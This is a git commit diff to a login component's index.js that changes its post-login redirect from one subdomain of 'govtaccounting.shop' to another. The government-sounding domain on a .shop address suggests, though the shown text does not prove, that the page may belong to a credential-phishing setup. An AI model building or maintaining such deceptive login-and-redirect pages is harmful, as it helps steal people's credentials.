959116d77b8c76e41691598fe0a932df19b5f1a4
husknet <127146284+husknet@users.noreply.github.com>
2025-04-03 11:50:24 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://np.govtaccounting.shop/';
+      window.location.href = 'https://tp.govtaccounting.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
